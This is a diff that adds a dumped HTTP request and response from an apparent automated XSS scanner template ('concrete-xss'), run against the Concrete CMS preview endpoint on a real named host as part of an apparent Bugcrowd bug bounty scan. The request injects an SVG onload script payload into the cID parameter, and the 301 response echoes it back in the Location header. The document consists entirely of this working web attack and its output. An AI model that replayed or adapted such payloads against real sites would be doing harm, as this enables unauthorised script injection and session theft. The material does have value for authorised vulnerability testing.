@@ -1,0 +1,26 @@
+[concrete-xss] Dumped HTTP request for https://techsolutions.bitpanda.com/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("30rvFV6P9jvfteccTgoCy8zgRxS")>
+
+
+GET /ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("30rvFV6P9jvfteccTgoCy8zgRxS")> HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[concrete-xss] Dumped HTTP response https://techsolutions.bitpanda.com/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("30rvFV6P9jvfteccTgoCy8zgRxS")>
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Location: ./preview/?cID="></iframe><svg/onload=alert("30rvFV6P9jvfteccTgoCy8zgRxS")>
+Via: 1.1 31467e378930bcac2417aea59659f7e6.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: UNhf3wR1dwuWL9xRHrp570Wpcs3BI3JABAcJc8w5nmvrAGX04L4xQg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
